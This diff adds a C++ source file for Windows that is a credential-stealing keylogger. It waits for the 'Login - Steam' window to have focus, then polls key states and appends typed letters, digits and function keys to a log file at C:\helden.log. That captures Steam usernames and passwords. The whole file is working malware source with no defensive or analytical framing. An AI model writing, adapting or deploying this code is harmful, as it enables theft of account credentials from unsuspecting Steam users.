@@ -1,0 +1,214 @@
+#include <windows.h>
+#include <stdio.h>
+#include <fstream>
+#include <iostream>
+
+using namespace std;
+
+short character;
+bool running = true;
+
+BOOL GetSteam();
+char filename[256] = "C:\\helden.log";
+bool bFirst = false;
+int main(void)
+{
+GetSteam();
+
+return 0;
+}
+
+BOOL GetSteam() {
+
+start:
+while(GetForegroundWindow() != FindWindow(NULL, "Login - Steam"))
+{
+if(!bFirst) {
+cout<<"\nwait for \"steam - login\" window\n";
+bFirst = true;
+}
+Sleep(20);
+}
+
+cout<<"\nsteam window found\n";
+printf("logging to %s started", filename);
+
+
+
+while(running)
+{
+if(GetForegroundWindow() != FindWindow(NULL, "Login - Steam"))
+{
+if(bFirst) {
+
+cout<<"\ngoto start and wait for the window\n";
+
+bFirst = false;
+}
+goto start;
+}
+for(character=8;character<=222;character++) /* found this function somewhere credit??*/
+{
+if(GetAsyncKeyState(character)==-32767)
+{
+ofstream stuff;
+stuff.open(filename, ofstream::out | ofstream::app);
+
+switch(character)
+{
+case VK_SPACE:
+stuff << "[space]";
+break;
+case VK_NUMPAD0:
+stuff << "0";
+break;
+case VK_NUMPAD1:
+stuff << "1";
+break;
+case VK_NUMPAD2:
+stuff << "2";
+break;
+case VK_NUMPAD3:
+stuff << "3";
+break;
+case VK_NUMPAD4:
+stuff << "4";
+break;
+case VK_NUMPAD5:
+stuff << "5";
+break;
+case VK_NUMPAD6:
+stuff << "6";
+break;
+case VK_NUMPAD7:
+stuff << "7";
+break;
+case VK_NUMPAD8:
+stuff << "8";
+break;
+case VK_NUMPAD9:
+stuff << "9";
+break;
+case VK_F1:
+stuff << "F1";
+break;
+case VK_F2:
+stuff << "F2";
+break;
+case VK_F3:
+stuff << "F3";
+break;
+case VK_F4:
+stuff << "F4";
+break;
+case VK_F5:
+stuff << "F5";
+break;
+case VK_F6:
+stuff << "F6";
+break;
+case VK_F7:
+stuff << "F7";
+break;
+case VK_F8:
+stuff << "F8";
+break;
+case VK_F9:
+stuff << "F9";
+break;
+case VK_F10:
+stuff << "F10";
+break;
+case VK_F11:
+stuff << "F11";
+break;
+case VK_F12:
+stuff << "F12";
+break;
+case 65:
+stuff << "a";
+break;
+case 66:
+stuff << "b";
+break;
+case 67:
+stuff << "c";
+break;
+case 68:
+stuff << "d";
+break;
+case 69:
+stuff << "e";
+break;
+case 70:
+stuff << "f";
+break;
+case 71:
+stuff << "g";
+break;
+case 72:
+stuff << "h";
+break;
+case 73:
+stuff << "i";
+break;
+case 74:
+stuff << "j";
+break;
+case 75:
+stuff << "k";
+break;
+case 76:
+stuff << "l";
+break;
+case 77:
+stuff << "m";
+break;
+case 78:
+stuff << "n";
+break;
+case 79:
+stuff << "o";
+break;
+case 80:
+stuff << "p";
+break;
+case 81:
+stuff << "q";
+break;
+case 82:
+stuff << "r";
+break;
+case 83:
+stuff << "s";
+break;
+case 84:
+stuff << "t";
+break;
+case 85:
+stuff << "u";
+break;
+case 86:
+stuff << "v";
+break;
+case 87:
+stuff << "w";
+break;
+case 88:
+stuff << "x";
+break;
+case 89:
+stuff << "y";
+break;
+case 90:
+stuff << "z";
+break;
+
+}
+}
+
+}
+Sleep(20);
+}
+return 1;
+} 
